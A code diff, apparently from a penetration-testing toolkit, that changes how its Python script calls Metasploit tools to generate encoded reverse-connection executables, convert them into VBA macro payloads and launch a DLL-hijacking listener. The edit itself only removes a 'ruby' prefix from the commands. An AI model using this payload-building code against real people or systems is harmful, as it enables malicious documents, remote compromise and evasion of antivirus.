@@ -167,7 +167,7 @@ if exploit_counter == 0:
     # START THE EXE TO VBA PAYLOAD
     if exploit != 'custom/exe/to/vba/payload':
         outfile = setdir + "/%s" % (outfile)
-        subprocess.Popen("ruby %s/msfcli %s PAYLOAD=%s LHOST=%s LPORT=%s OUTPUTPATH=%s FILENAME=%s %s ENCODING=shikata_ga_nai %s E" % (meta_path,exploit,payload,rhost,lport,outpath,outfile,target,inputpdf), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
+        subprocess.Popen("%s/msfcli %s PAYLOAD=%s LHOST=%s LPORT=%s OUTPUTPATH=%s FILENAME=%s %s ENCODING=shikata_ga_nai %s E" % (meta_path,exploit,payload,rhost,lport,outpath,outfile,target,inputpdf), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
         subprocess.Popen("cp " + users_home + "/.msf4/local/%s %s" % (filename_code, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
         print_status("Payload creation complete.")
         time.sleep(1)
@@ -181,9 +181,9 @@ if exploit_counter == 0:
         if noencode == 1:
             execute1=("exe")
             payloadname=("vb.exe")
-        subprocess.Popen("ruby %s/msfvenom -p %s %s %s -e shikata_ga_nai --format=%s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True).wait()
+        subprocess.Popen("%smsfvenom -p %s %s %s -e shikata_ga_nai --format=%s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True).wait()
         if noencode == 0:
-            subprocess.Popen("ruby %s/msfencode -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" % (meta_path,setdir,setdir), shell=True).wait()
+            subprocess.Popen("%smsfencode -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" % (meta_path,setdir,setdir), shell=True).wait()
         # Create the VB script here
         subprocess.Popen("%s/tools/exe2vba.rb %s/vb.exe %s/template.vbs" % (meta_path,setdir,setdir), shell=True).wait()
         print_info("Raring the VBS file.")
@@ -256,7 +256,7 @@ if exploit == "dll_hijacking":
         if not os.path.isfile("%s/fileformat.file" % (setdir)):
             print_info("This may take a few to load MSF...")
             try:
-                child1=pexpect.spawn("ruby %s/msfconsole -L -r %s/meta_config" % (meta_path,setdir))
+                child1=pexpect.spawn("%smsfconsole -L -r %s/meta_config" % (meta_path,setdir))
             except:
                 try:
                     child1.close()
